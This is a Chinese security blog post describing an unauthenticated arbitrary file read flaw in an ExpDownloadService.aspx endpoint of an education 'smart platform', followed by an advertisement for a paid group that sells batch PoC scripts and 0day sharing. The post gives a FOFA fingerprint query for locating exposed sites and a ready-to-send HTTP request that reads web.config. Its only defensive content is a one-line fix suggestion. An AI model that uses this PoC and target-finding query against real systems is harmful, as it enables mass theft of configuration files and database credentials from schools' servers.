#  「漏洞复现」EDU 某智慧平台 ExpDownloadService.aspx 任意文件读取漏洞   
冷漠安全  冷漠安全   2024-10-04 18:27  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
**0x01 免责声明**  
  
**免责声明**  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
**漏洞威胁**  
  
EDU 某智慧平台 ExpDownloadService.aspx 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。  
  
0x03  
  
**漏洞环境**  
  
FOFA:  
```
body="custom/blue/uimaker/easyui.css"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0rjPpAguMG3viaFcarqib8yFH3ichDaoSOoVia2Tv5wkogYuhHOybRaHnjzc5STHl7dewWvQzSVHguVxQ/640?wx_fmt=png&from=appmsg "")  
  
  
0x04  
  
**漏洞复现**  
  
PoC  
```
GET /ExpDownloadService.aspx?DownfilePath=/web.config HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate
Connection: keep-alive
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0rjPpAguMG3viaFcarqib8yFH1V2blNugiaaYw6latGYIUcMnfC6OFOZa60RSLJlnwTwdicaBjGxDqWWw/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
**批量脚本验证**  
  
Nuclei验证脚本已发布  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0rjPpAguMG3viaFcarqib8yFHF4P182f7wCtKxSID97YpRPghyCM2DKLJj3KqHwazxib1BQa3TI2HksA/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
**修复建议**  
  
关闭互联网暴露面或接口设置访问权限  
  
0x07  
  
**加入我们**  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全交个朋友，限时优惠券：加入立减25星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0rjPpAguMG3viaFcarqib8yFH8VNt6QCPwDWWDeezgzLicXH9HTKXKOeqqXcd3kibEGaa9MK41pmRaujA/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0rjPpAguMG3viaFcarqib8yFHvaNZSHYb27t7ichC8n4w2pwMEM1bcIAeyjqjibIY2FO1t1rABDahZRkQ/640?wx_fmt=gif&from=appmsg "")  
  
  
